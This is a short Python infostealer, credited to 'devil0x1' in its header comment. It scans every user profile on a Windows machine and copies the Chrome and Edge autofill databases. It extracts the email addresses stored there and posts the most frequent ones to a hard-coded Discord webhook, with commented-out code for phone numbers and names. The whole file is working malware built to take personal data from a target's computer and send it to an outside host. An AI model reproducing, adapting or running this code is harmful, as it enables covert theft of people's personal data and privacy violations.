
# This bitch is created by devil0x1 for extracting shity mails from the target



import os
from pathlib import Path
import sqlite3
import re
from datetime import datetime
import requests
import tempfile
import shutil
import os
USER_DIR = Path(os.environ["SYSTEMDRIVE"] + "\\Users") 
os.system('cls')

browser_paths = {
    "Chrome": "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data",
    "Edge": "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data"
}



with tempfile.TemporaryDirectory() as temp_dir:
    temp_dir_path = Path(temp_dir)
    copied_dbs = []

    for user in USER_DIR.iterdir():
        if not user.is_dir():
            continue
        for browser, path in browser_paths.items():
            db_path = user / path
            if db_path.exists():
                timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
                dest_name = f"{user.name}_{browser}_Web_Data_{timestamp}.db"
                dest_path = temp_dir_path / dest_name
                try:
                    shutil.copy2(db_path, dest_path)
                    copied_dbs.append((dest_path, browser, user.name))
                except PermissionError:
                    continue

    def extract_tables(db_file):
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        try:
            tables = cursor.execute(
                "SELECT name FROM sqlite_master WHERE type='table';"
            ).fetchall()
        except sqlite3.DatabaseError:
            conn.close()
            return {}
        data = {}
        for table_name, in tables:
            try:
                rows = cursor.execute(f"SELECT * FROM `{table_name}`").fetchall()
                data[table_name] = rows
            except sqlite3.DatabaseError:
                continue
        conn.close()
        return data

    all_data = {}
    for db_file, browser, username in copied_dbs:
        all_data[f"{username}_{browser}"] = extract_tables(db_file)

    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    
    
    

    emails = {}
   
    for user in USER_DIR.iterdir():
        if not user.is_dir():
            continue
            
       

    for db_name, tables in all_data.items():
        for table, rows in tables.items():
            for row in rows:
                text = " ".join(map(str, row))
                
                for e in email_pattern.findall(text):
                    email = e.lower()
                    emails[email] = emails.get(email, 0) + 1
                    
                    
                
                # for p in phone_pattern.findall(text):
                #     phones[p] = phones.get(p, 0) + 1
                
                # for fn in first_name_pattern.findall(text):
                #     if len(fn) > 1: 
                #         first_names[fn.lower()] = first_names.get(fn.lower(), 0) + 1
                
                # for ln in last_name_pattern.findall(text):
                #     if len(ln) > 1: 
                #         last_names[ln.lower()] = last_names.get(ln.lower(), 0) + 1

    def top_n(d, n=5):
        return sorted(d.items(), key=lambda x: x[1], reverse=True)[:n]

    top_emails = top_n(emails, 15)
    # top_phones = top_n(phones, 5)
    # top_first_names = top_n(first_names, 5)
    # top_last_names = top_n(last_names, 5)

    def send_to_discord_webhook(webhook_url, content):
        if len(content) > 2000:
            chunks = [content[i:i+2000] for i in range(0, len(content), 2000)]
            for chunk in chunks:
                data = {
                    "content": chunk,
                    "username": "Devil0x1 Extractor",
                    "avatar_url": "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
                }
                try:
                    result = requests.post(webhook_url, json=data, timeout=10)
                    result.raise_for_status()
                    print(f" Payload delivered successfully")
                except requests.exceptions.HTTPError as err:
                    print(f" Error sending to Discord: {err}")
                except Exception as e:
                    print(f" Unexpected error: {e}")
        else:
            data = {
                "content": content,
                "username": "Devil0x1 Extractor",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
            }
            try:
                result = requests.post(webhook_url, json=data, timeout=10)
                result.raise_for_status()
                print("✓ Payload delivered successfully")
            except requests.exceptions.HTTPError as err:
                print(f"✗ Error sending to Discord: {err}")
            except Exception as e:
                print(f"✗ Unexpected error: {e}")
  #chnage this var lol to your web hook
    DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1413504420272144435/kGuFZyXZMU-KhWUJt9g7AtLl3ltx_hbOvFk8k0ityoacdO0lKXXaLPAjH7Qq1ry6A55Y"

    message = "**🙊🙉🙈Extracter deep** \n"
    message += "---------\n\n"
    
    message += "**TOP EMAIL ADDRESSES**\n"
    for i, (email, count) in enumerate(top_emails, 1):
        message += f"{i}. `{email}` (found {count} times)\n"
    
    
    
   

    print(" Attempting to send to Discord webhook...")
    print(f" Webhook URL: {DISCORD_WEBHOOK_URL}")

    send_to_discord_webhook(DISCORD_WEBHOOK_URL, message)

print(" Process completed,check the discord where you maded the hook for :).")
